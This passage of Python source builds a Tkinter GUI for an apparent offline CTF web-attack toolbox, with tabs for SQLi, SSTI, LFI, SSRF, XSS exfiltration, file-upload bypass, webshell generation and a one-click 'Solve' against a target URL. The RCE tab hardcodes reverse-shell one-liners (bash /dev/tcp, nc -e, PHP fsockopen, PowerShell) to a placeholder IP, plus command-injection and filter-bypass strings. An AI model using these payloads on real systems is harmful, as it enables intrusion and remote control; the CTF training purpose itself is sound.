                _append(self.ref_text, "无法打开图片: " + str(e))



    def _do_encode(self):

        text = self.io_entry.get().strip()

        cid = self._selected_cid

        if not cid:

            _clear_output(self.output)

            _append(self.output, "⚠ 请先选择密码类型")

            return

        if not text:

            _clear_output(self.output)

            _append(self.output, "⚠ 请输入文本")

            return

        key = self.key_entry.get().strip()

        _clear_output(self.output)

        try:

            result = mc_encode(cid, text, key=key)

            _append(self.output, "🔒 " + cid + " 编码:\n" + result)

        except Exception as e:

            _append(self.output, "❌ 错误: " + str(e))



    def _do_decode(self):

        text = self.io_entry.get().strip()

        cid = self._selected_cid

        if not cid:

            _clear_output(self.output)

            _append(self.output, "⚠ 请先选择密码类型")

            return

        if not text:

            _clear_output(self.output)

            _append(self.output, "⚠ 请输入文本")

            return

        key = self.key_entry.get().strip()

        _clear_output(self.output)

        try:

            result = mc_decode(cid, text, key=key)

            _append(self.output, "🔓 " + cid + " 解码:\n" + result)

        except Exception as e:

            _append(self.output, "❌ 错误: " + str(e))





class ScriptsPanel(tk.Frame):

    """CTF scripts panel with dependency management."""

    def __init__(self, parent):

        super().__init__(parent, bg=BG)

        _label(self, "CTF Scripts", fg=ACCENT, font_size=16, bold=True, pady=8)

        _label(self, "D:\\CTF 41 scripts + dep management + Web Solver", fg=YELLOW, font_size=9)



        # Solve bar — input URL, one-click attack

        solve_bar = tk.Frame(self, bg=DARK)

        solve_bar.pack(fill=tk.X, padx=4, pady=(4, 0))

        tk.Label(solve_bar, text="Target:", bg=DARK, fg=ACCENT,

                 font=("Microsoft YaHei UI", 10, "bold")).pack(side=tk.LEFT, padx=(8, 4))

        self.url_entry = tk.Entry(solve_bar, bg=INPUT_BG, fg=FG,

                                   insertbackground=ACCENT, relief="flat",

                                   font=("Cascadia Code", 10),

                                   width=50)

        self.url_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=4, ipady=3)

        self.url_entry.insert(0, "http://")

        self.solve_btn = tk.Button(solve_bar, text="Solve", command=self._solve_url,

                                    bg=ACCENT, fg=DARK, activebackground=GREEN,

                                    relief="flat", padx=16, pady=3, cursor="hand2",

                                    font=("Microsoft YaHei UI", 10, "bold"))

        self.solve_btn.pack(side=tk.LEFT, padx=(4, 8))



        # Search bar + dep buttons

        top_bar = tk.Frame(self, bg=BG)

        top_bar.pack(fill=tk.X, pady=(8, 4), padx=4)

        tk.Label(top_bar, text="Search", bg=BG, fg=ACCENT,

                 font=("Microsoft YaHei UI", 12)).pack(side=tk.LEFT)

        self.search_entry = tk.Entry(top_bar, bg=INPUT_BG, fg=FG,

                                      insertbackground=ACCENT, relief="flat",

                                      font=("Cascadia Code", 11), width=25)

        self.search_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=8, ipady=4)

        self.search_entry.bind("<KeyRelease>", self._do_search)

        tk.Button(top_bar, text="Check Deps", command=self._check_deps,

                  bg=INPUT_BG, fg=YELLOW, activebackground=ACCENT, relief="flat",

                  padx=10, pady=4, cursor="hand2",

                  font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=2)

        tk.Button(top_bar, text="Install All", command=self._install_all_deps,

                  bg=INPUT_BG, fg=GREEN, activebackground=ACCENT, relief="flat",

                  padx=10, pady=4, cursor="hand2",

                  font=("Microsoft YaHei UI", 9)).pack(side=tk.LEFT, padx=2)



        cat_frame = tk.Frame(self, bg=BG)

        cat_frame.pack(fill=tk.X, pady=4, padx=4)

        self.cat_buttons = {}

        for cat_key, cat_label in [("all", "All"), ("crypto", "Crypto"),

                                    ("web", "Web"), ("reverse", "Reverse"),

                                    ("misc", "Misc")]:

            btn = tk.Button(cat_frame, text=cat_label, relief="flat",

                           bg=INPUT_BG, fg=FG, activebackground=ACCENT,

                           activeforeground=DARK, padx=12, pady=4,

                           cursor="hand2", font=("Microsoft YaHei UI", 9),

                           command=lambda c=cat_key: self._filter_cat(c))

            btn.pack(side=tk.LEFT, padx=2)

            self.cat_buttons[cat_key] = btn

        self.dep_status_label = tk.Label(cat_frame, text="", bg=BG, fg=YELLOW,

                                          font=("Microsoft YaHei UI", 8))

        self.dep_status_label.pack(side=tk.RIGHT, padx=8)



        panes = tk.PanedWindow(self, bg=BG, sashwidth=3)

        panes.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)



        list_frame = tk.Frame(panes, bg=BG)

        panes.add(list_frame, width=340)

        _label(list_frame, "Scripts:", pady=4)

        self.script_list = tk.Listbox(list_frame, bg=INPUT_BG, fg=FG,

                                       selectbackground=ACCENT,

                                       selectforeground=DARK,

                                       relief="flat", borderwidth=0,

                                       font=("Microsoft YaHei UI", 10),

                                       height=20)

        self.script_list.pack(fill=tk.BOTH, expand=True, pady=(0, 4))

        self.script_list.bind("<<ListboxSelect>>", self._on_select)



        detail_frame = tk.Frame(panes, bg=BG)

        panes.add(detail_frame, width=580)

        _label(detail_frame, "Details:", pady=4)

        self.detail_frame, self.detail_output = _output_area(detail_frame, 18)

        self.detail_frame.pack(fill=tk.BOTH, expand=True)



        btn_bar = tk.Frame(detail_frame, bg=BG)

        btn_bar.pack(fill=tk.X, pady=4)

        tk.Button(btn_bar, text="Run", command=self._run_selected,

                  bg=GREEN, fg=DARK, activebackground=ACCENT, relief="flat",

                  padx=20, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 11, "bold")).pack(side=tk.LEFT, padx=(0, 8))

        self.install_btn = tk.Button(btn_bar, text="Install Script Deps",

                                      command=self._install_script_deps,

                                      bg=INPUT_BG, fg=YELLOW, activebackground=ACCENT,

                                      relief="flat", padx=12, pady=6, cursor="hand2",

                                      font=("Microsoft YaHei UI", 10))

        self.install_btn.pack(side=tk.LEFT, padx=(0, 8))

        self.install_btn.pack_forget()

        tk.Button(btn_bar, text="Clear", command=lambda: _clear_output(self.detail_output),

                  bg=RED, fg=DARK, activebackground="#ff6b6b", relief="flat",

                  padx=16, pady=6, cursor="hand2",

                  font=("Microsoft YaHei UI", 10)).pack(side=tk.LEFT)



        self._all_scripts = []

        self._current_key = None

        self._dep_status = {}

        self._populate_list()



    def _populate_list(self, category=None, query=None):

        self.script_list.delete(0, tk.END)

        self._all_scripts = []

        try:

            from .scripts.registry import SCRIPTS, CATEGORIES

            from .scripts.deps import check_dep

            for key, meta in sorted(SCRIPTS.items(), key=lambda x: x[0]):

                if category and category != "all" and meta["category"] != category:

                    continue

                if query and query.lower() not in key.lower() and query.lower() not in meta["title"].lower() and query.lower() not in meta["description"].lower():

                    continue

                cat_icon = CATEGORIES.get(meta["category"], "?")

                if meta["deps"]:

                    all_ok = all(check_dep(d) for d in meta["deps"])

                    dep_icon = " [OK]" if all_ok else " [MISS]"

                else:

                    dep_icon = ""

                display = cat_icon + " " + meta['title'] + dep_icon

                self.script_list.insert(tk.END, display)

                self._all_scripts.append((key, meta))

        except Exception as e:

            self.script_list.insert(tk.END, "err: " + str(e))



    def _filter_cat(self, cat):

        for k, btn in self.cat_buttons.items():

            if k == cat:

                btn.configure(bg=ACCENT, fg=DARK)

            else:

                btn.configure(bg=INPUT_BG, fg=FG)

        self._populate_list(category=cat)



    def _do_search(self, event):

        q = self.search_entry.get().strip()

        self._populate_list(query=q if q else None)



    def _on_select(self, event):

        sel = self.script_list.curselection()

        if not sel:

            return

        idx = sel[0]

        if idx >= len(self._all_scripts):

            return

        key, meta = self._all_scripts[idx]

        self._current_key = key

        _clear_output(self.detail_output)

        _append(self.detail_output, "title: " + meta['title'] + "\n")

        _append(self.detail_output, "=" * 50 + "\n")

        _append(self.detail_output, "category: " + meta['category'] + "\n")

        _append(self.detail_output, "desc: " + meta['description'] + "\n")

        _append(self.detail_output, "usage: " + meta['usage'] + "\n")

        _append(self.detail_output, "input: " + meta['input_type'] + " -> output: " + meta['output_type'] + "\n")

        if meta["deps"]:

            from .scripts.deps import check_dep

            _append(self.detail_output, "\ndep status:\n")

            all_ok = True

            for d in meta["deps"]:

                ok = check_dep(d)

                icon = "  ok" if ok else "  MISS"

                _append(self.detail_output, icon + " " + d + "\n")

                if not ok:

                    all_ok = False

            if all_ok:

                self.install_btn.pack_forget()

            else:

                self.install_btn.pack(side=tk.LEFT, padx=(0, 8))

        else:

            _append(self.detail_output, "\nzero deps\n")

            self.install_btn.pack_forget()



    def _run_selected(self):

        if not self._current_key:

            _clear_output(self.detail_output)

            _append(self.detail_output, "select a script first")

            return

        try:

            from .scripts.runner import run_script as _run

            meta = None

            for k, m in self._all_scripts:

                if k == self._current_key:

                    meta = m

                    break

            _clear_output(self.detail_output)

            title = meta['title'] if meta else self._current_key

            _append(self.detail_output, "running: " + title + "\n")

            _append(self.detail_output, "=" * 50 + "\n\n")

            result = _run(self._current_key)

            if result["stdout"]:

                _append(self.detail_output, result["stdout"])

            if result["stderr"]:

                _append(self.detail_output, "\nerr:\n" + result['stderr'])

            if result["success"]:

                _append(self.detail_output, "\n" + "=" * 50 + "\nOK")

            else:

                _append(self.detail_output, "\n" + "=" * 50 + "\nFAIL code=" + str(result['exit_code']))

        except Exception as e:

            _clear_output(self.detail_output)

            _append(self.detail_output, "error: " + str(e))



    def _check_deps(self):

        _clear_output(self.detail_output)

        _append(self.detail_output, "checking deps...\n")

        _append(self.detail_output, "=" * 50 + "\n\n")

        try:

            from .scripts.deps import check_all_deps

            status = check_all_deps()

            if not status:

                _append(self.detail_output, "all zero-dependency\n")

                self.dep_status_label.configure(text="all zero-deps", fg=GREEN)

                return

            total = 0

            missing = 0

            for key, info in status.items():

                ok = "OK" if info["all_ok"] else "MISS"

                _append(self.detail_output, ok + " " + info['meta']['title'] + "\n")

                total += 1

                for d in info["deps"]:

                    icon = "    ok" if d["installed"] else "    MISS"

                    _append(self.detail_output, icon + " " + d['name'] + "\n")

                if not info["all_ok"]:

                    missing += 1

                _append(self.detail_output, "\n")

            if missing == 0:

                _append(self.detail_output, "\nall " + str(total) + " OK")

                self.dep_status_label.configure(text="all " + str(total) + " OK", fg=GREEN)

            else:

                _append(self.detail_output, "\n" + str(missing) + "/" + str(total) + " MISS")

                self.dep_status_label.configure(text=str(missing) + "/" + str(total) + " MISS", fg=YELLOW)

        except Exception as e:

            _append(self.detail_output, "check failed: " + str(e))



    def _install_all_deps(self):

        _clear_output(self.detail_output)

        _append(self.detail_output, "installing missing deps...\n")

        _append(self.detail_output, "=" * 50 + "\n\n")

        import threading

        def run():

            try:

                from .scripts.deps import get_missing_deps, install_all_missing

                missing = get_missing_deps()

                if not missing:

                    _append(self.detail_output, "all installed\n")

                    self.dep_status_label.configure(text="all installed", fg=GREEN)

                    return

                pkgs = ", ".join(sorted(missing))

                _append(self.detail_output, "installing " + str(len(missing)) + ": " + pkgs + "\n\n")

                _append(self.detail_output, "please wait... pip is running\n")

                results = install_all_missing()

                ok_count = 0

                for r in results:

                    icon = "OK" if r["success"] else "FAIL"

                    msg = r['message']

                    if isinstance(msg, bytes):

                        msg = msg.decode('utf-8', errors='replace')

                    _append(self.detail_output, icon + " " + r['dep'] + ": " + msg + "\n")

                    if r["success"]:

                        ok_count += 1

                _append(self.detail_output, "\n" + "=" * 50 + "\n")

                if ok_count == len(results):

                    _append(self.detail_output, "all " + str(ok_count) + " installed")

                    self.dep_status_label.configure(text="all installed", fg=GREEN)

                else:

                    _append(self.detail_output, str(ok_count) + "/" + str(len(results)) + " OK")

                self._populate_list()

            except Exception as e:

                _append(self.detail_output, "install failed: " + str(e))

        t = threading.Thread(target=run, daemon=True)

        t.start()



    def _install_script_deps(self):

        if not self._current_key:

            return

        try:

            from .scripts.deps import install_deps_for_script

            from .scripts.registry import get_script

            meta = get_script(self._current_key)

            if not meta or not meta["deps"]:

                return

            _clear_output(self.detail_output)

            _append(self.detail_output, "installing '" + meta['title'] + "' deps: " + ", ".join(meta['deps']) + "\n")

            _append(self.detail_output, "=" * 50 + "\n\n")

            _append(self.detail_output, "please wait... pip is running\n")

        except Exception as e:

            _append(self.detail_output, "prep error: " + str(e))

            return

        import threading

        def run():

            try:

                from .scripts.deps import install_deps_for_script

                results = install_deps_for_script(self._current_key)

                ok_count = 0

                for r in results:

                    icon = "OK" if r["success"] else "FAIL"

                    msg = r['message']

                    if isinstance(msg, bytes):

                        msg = msg.decode('utf-8', errors='replace')

                    _append(self.detail_output, icon + " " + r['dep'] + ": " + msg + "\n")

                    if r["success"]:

                        ok_count += 1

                _append(self.detail_output, "\n" + "=" * 50 + "\n")

                if ok_count == len(results):

                    _append(self.detail_output, "done, ready to run")

                sel = self.script_list.curselection()

                if sel:

                    self._on_select(None)

                self._populate_list()

            except Exception as e:

                _append(self.detail_output, "install failed: " + str(e))

        t = threading.Thread(target=run, daemon=True)

        t.start()



    def _solve_url(self):

        url = self.url_entry.get().strip()

        if not url or url == "http://":

            _clear_output(self.detail_output)

            _append(self.detail_output, "Enter a target URL and click Solve\n")

            return

        self.solve_btn.configure(text="Running...", state="disabled", bg=RED)

        _clear_output(self.detail_output)

        _append(self.detail_output, "Target: " + url + "\n")

        _append(self.detail_output, "=" * 50 + "\n\n")

        import threading

        def run():

            try:

                from .scripts.solver import solve_web

                def progress(step, status, detail):

                    if status == "flag!":

                        _append(self.detail_output, "\nFLAG: " + detail + "\n")

                    elif status == "running":

                        _append(self.detail_output, step + " " + detail + "\n")

                    else:

                        s = "> " if status == "ok" else "x "

                        _append(self.detail_output, s + step + ": " + detail + "\n")

                result = solve_web(url, progress_callback=progress)

                _append(self.detail_output, "\n" + "=" * 50 + "\n")

                if result["flag"]:

                    _append(self.detail_output, "FLAG: " + result["flag"] + "\n")

                else:

                    _append(self.detail_output, "No flag found - try other tabs or manual scripts\n")

            except Exception as e:

                _append(self.detail_output, "Error: " + str(e) + "\n")

            self.solve_btn.configure(text="Solve", state="normal", bg=ACCENT)

        t = threading.Thread(target=run, daemon=True)

        t.start()



def _pretty_json(obj):

    import json

    return json.dumps(obj, indent=2, ensure_ascii=False)





# ═══════════════════════════════════════════════════════════

#  主窗口

# ═══════════════════════════════════════════════════════════



def run_gui():

    root = tk.Tk()

    root.title("Yang-Web Arsenal — 离线 CTF Web 工具箱")

    root.geometry("1100x720")

    root.minsize(900, 600)

    apply_theme(root)



    # ── 状态: gui 还是 cli ──

    mode = {"current": "gui"}



    # ── 顶部标题栏 ──

    header = tk.Frame(root, bg=DARK, height=52)

    header.pack(fill=tk.X)

    header.pack_propagate(False)

    tk.Label(header, text="🔧  Yang-Web", bg=DARK, fg=ACCENT,

             font=("Cascadia Code", 16, "bold")).pack(side=tk.LEFT, padx=20, pady=10)



    mode_label = tk.Label(header, text="离线 CTF Web 瑞士军刀  ·  15 个模块 + 41 内嵌脚本",

             bg=DARK, fg=YELLOW, font=("Microsoft YaHei UI", 9))

    mode_label.pack(side=tk.LEFT, pady=14)



    # ── 切换按钮 ──

    toggle_btn = tk.Button(header, text="💻 CLI",

                           bg=INPUT_BG, fg=ACCENT, relief="flat", borderwidth=1,

                           padx=14, pady=4, cursor="hand2",

                           font=("Microsoft YaHei UI", 9, "bold"),

                           activebackground=BORDER, activeforeground=ACCENT)

    toggle_btn.pack(side=tk.RIGHT, padx=16, pady=10)



    # ── 内容容器 ──

    content = tk.Frame(root, bg=BG)

    content.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)



    # GUI 模式 — Notebook

    gui_frame = tk.Frame(content, bg=BG)

    notebook = ttk.Notebook(gui_frame)

    notebook.pack(fill=tk.BOTH, expand=True)



    # 解码

    decode_panel = DecodePanel(notebook)

    notebook.add(decode_panel, text=" 🔓 解码 ")



    # Payload 面板们

    def _add_payload_tab(title, emoji, get_fn, categories=None, search_fn=None, analyzer_fn=None):

        """Add a payload tab with optional category dropdown."""

        panel = PayloadPanel(notebook, title, emoji, get_fn, search_fn, analyzer_fn)

        if categories:

            panel.set_categories(categories)

        notebook.add(panel, text=f" {emoji} {title} ")

        return panel



    _add_payload_tab("SSTI", "🎨", ssti.get_exploit,

                     categories=list(ssti.EXPLOIT.keys()))

    _add_payload_tab("SQLi", "🗄️", sqli.get_exploit,

                     categories=list(sqli.EXPLOIT.keys()),

                     search_fn=sqli.search_payload)



    # ── LFI ──

    def _lfi_get(cat):

        data = {

            "路径遍历": {"路径遍历Payload": lfi.get_path_traversal()},

            "敏感文件(Linux)": lfi.get_sensitive_files("Linux"),

            "敏感文件(Windows)": lfi.get_sensitive_files("Windows"),

            "PHP伪协议": lfi.get_php_wrappers(),

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}

    _add_payload_tab("LFI", "📂", _lfi_get,

                     categories=["路径遍历", "敏感文件(Linux)", "敏感文件(Windows)", "PHP伪协议"])



    # ── SSRF ──

    def _ssrf_get(cat):

        data = {

            "云元数据": ssrf.get_cloud_metadata(),

            "绕过技巧": {"SSRF Bypass": ssrf.get_bypass()},

            "常见端口": ssrf.get_common_ports(),

            "内网地址": {"内网IP段": ssrf.get_internal_ranges()},

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}

    _add_payload_tab("SSRF", "🌐", _ssrf_get,

                     categories=["云元数据", "绕过技巧", "常见端口", "内网地址"])



    # ── XSS ──

    def _xss_get(cat):

        data = {

            "检测Payload": {"XSS检测": xss.get_detection()},

            "数据外传": {"Exfiltration": xss.get_exfiltration()},

            "WAF绕过": xss.get_bypass(),

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}

    _add_payload_tab("XSS", "💉", _xss_get,

                     categories=["检测Payload", "数据外传", "WAF绕过"])



    # ── PHP ──

    def _php_get(cat):

        data = {

            "Magic Hash": {"MD5(0e...)": php.MAGIC_HASHES.get("MD5 (0e...)", [])[:15]},

            "弱类型比较": {k: [i.get("example", str(i)) for i in v]

                        for k, v in php.TYPE_JUGGLING.items()},

            "RCE Bypass": {"常见绕过": php.PHP_RCE_BYPASS.get("常见命令执行函数", [])[:15]},

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}

    _add_payload_tab("PHP", "🐘", _php_get,

                     categories=["Magic Hash", "弱类型比较", "RCE Bypass"])



    # ── Upload ──

    def _upload_get(cat):

        """Get upload payloads, filtered by category."""

        ext_sections = {}

        for k, v in upload.EXT_BYPASS.items():

            ext_sections[k] = v

        mime_items = []

        for k, v in upload.MIME_HEADER_FAKE.items():

            mime_items.append(f"{k}: Content-Type={v['Content-Type']}  |  文件头={v['文件头hex']}")

        content_sections = {}

        for k, v in upload.CONTENT_BYPASS.items():

            content_sections[k] = v

        all_data = {

            "后缀绕过": ext_sections,

            "大小写混淆": {"大小写混合": upload.EXT_BYPASS.get("大小写混合", [])},

            "多后缀组合": {"多后缀组合": upload.EXT_BYPASS.get("多后缀组合", [])},

            "NTFS & 空格点": {

                "NTFS 数据流": upload.EXT_BYPASS.get("NTFS 数据流 (Win)", []),

                "空格/点技巧": upload.EXT_BYPASS.get("空格/点技巧 (Win)", []),

            },

            "路径截断": {"路径截断": upload.EXT_BYPASS.get("路径截断", [])},

            "MIME伪造": {"Content-Type & 文件头": mime_items},

            "图片马内容绕过": content_sections,

            "一句话木马": {

                "eval版": [upload.generate_image_shell("eval")],

                "system版": [upload.generate_image_shell("system")],

                "极简版": [upload.generate_image_shell("one_liner")],

            },

            ".htaccess/.user.ini": {

                ".htaccess": [upload.generate_htaccess()],

                ".user.ini": [upload.generate_userini(), upload.generate_userini("shell.jpg")],

            },

            "高级技巧": {},

        }

        try:

            if hasattr(upload, 'ADVANCED_BYPASS'):

                all_data["高级技巧"] = upload.ADVANCED_BYPASS

        except Exception:

            pass

        try:

            if hasattr(upload, 'get_parse_vuln'):

                all_data["解析漏洞"] = upload.get_parse_vuln()

        except Exception:

            pass

        return all_data if not cat or cat == "全部" else {cat: all_data.get(cat, {})}

    def _upload_analyze(blacklist_str):

        """GUI 靶场黑名单分析."""

        import re

        ALL_EXTS = {'php','php3','php4','php5','php7','php8','phtml','pht','phps','phar','shtml','cgi'}

        blocked = set(re.findall(r'[a-zA-Z0-9]+', blacklist_str.lower()))

        

        lines = []

        lines.append(f"🎯 靶场黑名单分析")

        lines.append(f"  已拦截: {', '.join(sorted(blocked))}")

        

        safe = sorted(ALL_EXTS - blocked)

        if safe:

            lines.append(f"")

            lines.append(f"✅ 可用后缀 (不在黑名单):")

            for ext in safe:

                marker = " ⭐推荐" if ext in ('pht','phtml') else ""

                lines.append(f"  • .{ext}{marker}")

        else:

            lines.append(f"\n❌ 所有常见后缀均在黑名单中")

        

        lines.append(f"")

        lines.append(f"🔤 大小写混合策略:")

        for v in ['Php','pHp','PHP','pHp5','PhP']:

            ext = v.lower()

            tag = "✅" if ext in blocked else "⚪"

            lines.append(f"  {tag} {v}")

        

        lines.append(f"")

        lines.append(f"📦 其他绕过:")

        lines.append(f"  • 双后缀: shell.php.jpg")

        lines.append(f"  • NTFS数据流: shell.php::$DATA")

        lines.append(f"  • 空格/点: shell.php .  (Windows)")

        

        return '\n'.join(lines)



    _add_payload_tab("Upload", "📤", _upload_get,

                     categories=["后缀绕过", "大小写混淆", "多后缀组合", "NTFS & 空格点",

                                  "路径截断", "MIME伪造", "图片马内容绕过", "一句话木马",

                                  ".htaccess/.user.ini", "解析漏洞", "高级技巧"],

                     analyzer_fn=_upload_analyze)



    # ── RCE ──

    def _rce_get(cat):

        data = {

            "反弹Shell": {"各语言反弹Shell": [

                "bash -i >& /dev/tcp/IP/PORT 0>&1",

                "nc -e /bin/sh IP PORT",

                "python3 -c 'import socket,subprocess,os;s=socket.socket();...'",

                "php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",

                "powershell -c \"$c=New-Object System.Net.Sockets.TCPClient('IP',PORT)...\"",

            ]},

            "命令注入链接符": {"链接符": [";", "|", "||", "&&", "&", "%0a", "`", "$(cmd)"]},

            "空格绕过": {"绕过技巧": ["${IFS}", "$IFS$9", "<>", "{ls,-la}", "%09", "%20"]},

            "关键字绕过": {"绕过技巧": ["c''at", "c\\at", "ca$*t", "/???/c?t", "c'a't"]},

        }

        return data if not cat or cat == "全部" else {cat: data.get(cat, [])}

    _add_payload_tab("RCE", "💻", _rce_get,

                     categories=["反弹Shell", "命令注入链接符", "空格绕过", "关键字绕过"])



    # Hash

    notebook.add(HashPanel(notebook), text=" 🔍 Hash ")



    # JWT

    notebook.add(JWTPanel(notebook), text=" 🔑 JWT ")



    # Scripts — 内嵌 CTF 脚本库

    notebook.add(ScriptsPanel(notebook), text=" 📦 脚本库 ")



    # Misc Crypto — 20+ common cipher types

    notebook.add(MiscCryptoPanel(notebook), text=" 🔐 Misc Crypto ")



    # ── CLI 模式 — 终端面板 (初始隐藏) ──

    cli_frame = tk.Frame(content, bg=DARK)



    # 终端输出区

    cli_output_frame, cli_output = _output_area(cli_frame, 30)

    cli_output_frame.pack(fill=tk.BOTH, expand=True, padx=6, pady=(6, 0))

    cli_output.configure(bg=DARK, fg=GREEN, font=("Cascadia Code", 10),

                         insertbackground=GREEN)



    # 底部输入行

    input_bar = tk.Frame(cli_frame, bg=DARK, height=34)

    input_bar.pack(fill=tk.X, padx=6, pady=6)

    input_bar.pack_propagate(False)



    prompt_label = tk.Label(input_bar, text=">>>", bg=DARK, fg=YELLOW,

                            font=("Cascadia Code", 11, "bold"))

    prompt_label.pack(side=tk.LEFT, padx=(6, 2), pady=4)



    cli_entry = tk.Entry(input_bar, bg=INPUT_BG, fg=FG, insertbackground=ACCENT,

                         relief="flat", borderwidth=0,

                         font=("Cascadia Code", 11))

    cli_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, ipady=3, padx=(2, 6))



    # ── CLI 历史与命令执行 ──

    import io

    from .cli import main as cli_main



    cli_history = []

    history_idx = [0]



    def _run_cli_cmd(cmd_text):

        _append(cli_output, f"{'>'*3} {cmd_text}", "input")



        if not cmd_text.strip():

            return



        cli_history.append(cmd_text)

        history_idx[0] = len(cli_history)



        # 内置命令

        if cmd_text.strip().lower() in ("clear", "cls"):

            _clear_output(cli_output)

            return

        if cmd_text.strip().lower() in ("help", "-h", "--help"):

            _append(cli_output, """

  Commands (same as CLI):

    decode BASE64 <text>       decode <text>           hashid <hash>

    encode BASE64 <text>       encode <text>           jwt <token>

    ssti python <tpl>          ssti <engine> <tpl>     scripts --run <name>

    sqli mysql <payload>       sqli <db> <payload>     scripts --search <kw>

    lfi <target>               lfi <path>              solve <url>

    ssrf <target>              ssrf <url>              scan dirs|files

    xss <target>               xss <context>           misc (密码知识库)

    rce <target>               rce <cmd>               clear, help, exit

    php <payload>               php <type>

  Tip: prefix all CLI-style args as-is, e.g.  scripts --run 'rsa_toolkit'

""")

            return

        if cmd_text.strip().lower() in ("exit", "quit"):

            return  # handled by toggle



        # Capture stdout

        old_stdout = sys.stdout

        old_stderr = sys.stderr

        buf = io.StringIO()

        sys.stdout = buf

        sys.stderr = buf



        try:

            # 拆分参数 (处理引号)

            import shlex

            try:

                args = shlex.split(cmd_text)

            except ValueError:

                args = cmd_text.split()



            sys.argv = ["yang_web"] + args

            try:

                cli_main()

            except SystemExit:

                pass



            out = buf.getvalue()

            if out.strip():

                for line in out.rstrip().split("\n"):

                    _append(cli_output, line)

            else:

                _append(cli_output, "(ok)")

        except Exception as e:

            _append(cli_output, f"Error: {e}")

        finally:

            sys.stdout = old_stdout

            sys.stderr = old_stderr

            buf.close()



    def _on_cli_enter(event):

        cmd = cli_entry.get().strip()

        if cmd.lower() in ("exit", "quit"):

            cli_entry.delete(0, tk.END)

            _toggle_mode()

            return

        _run_cli_cmd(cmd)

        cli_entry.delete(0, tk.END)



    def _on_cli_up(event):

        if not cli_history:

            return "break"

        if history_idx[0] > 0:

            history_idx[0] -= 1

        cli_entry.delete(0, tk.END)

        cli_entry.insert(0, cli_history[history_idx[0]])

        return "break"



    def _on_cli_down(event):

        if not cli_history:

            return "break"

        if history_idx[0] < len(cli_history) - 1:

            history_idx[0] += 1

            cli_entry.delete(0, tk.END)

            cli_entry.insert(0, cli_history[history_idx[0]])

        else:

            history_idx[0] = len(cli_history)

            cli_entry.delete(0, tk.END)

        return "break"



    cli_entry.bind("<Return>", _on_cli_enter)

    cli_entry.bind("<Up>", _on_cli_up)

    cli_entry.bind("<Down>", _on_cli_down)



    def _show_cli_welcome():

        _append(cli_output, "▔" * 60)

        _append(cli_output, "  Yang-Web CLI  —  嵌入式终端")

        _append(cli_output, f"  41 脚本  ·  15 模块  ·  离线运行")

        _append(cli_output, "▔" * 60)

        _append(cli_output, "  Type 'help' for commands, 'exit' to return to GUI")

        _append(cli_output, "")



    # ── 模式切换逻辑 ──

    def _toggle_mode():

        if mode["current"] == "gui":

            # 切换到 CLI

            gui_frame.pack_forget()

            cli_frame.pack(fill=tk.BOTH, expand=True)

            mode["current"] = "cli"

            toggle_btn.configure(text="🖥 GUI", fg=YELLOW)

            mode_label.configure(text="命令行模式  ·  Type 'help'  ·  'exit' 返回 GUI")



            # 欢迎信息

            _clear_output(cli_output)

            _show_cli_welcome()

            cli_entry.focus_set()

        else:

            # 切换回 GUI

            cli_frame.pack_forget()

            gui_frame.pack(fill=tk.BOTH, expand=True)

            mode["current"] = "gui"

            toggle_btn.configure(text="💻 CLI", fg=ACCENT)

            mode_label.configure(text="离线 CTF Web 瑞士军刀  ·  15 个模块 + 41 内嵌脚本")



    toggle_btn.configure(command=_toggle_mode)



    # 初始显示 GUI

    gui_frame.pack(fill=tk.BOTH, expand=True)



    # ── 底部状态栏 ──

    status = tk.Frame(root, bg=DARK, height=28)

    status.pack(fill=tk.X, side=tk.BOTTOM)

    status.pack_propagate(False)

    tk.Label(status, text="Yang-Web v1.4.0  |  GUI+CLI 双模式  |  上传靶场分析 + SQLi认证绕过  |  💻 切换",

             bg=DARK, fg=BORDER, font=("Microsoft YaHei UI", 8)).pack(side=tk.LEFT, padx=16, pady=4)



    root.mainloop()





if __name__ == "__main__":

    run_gui()

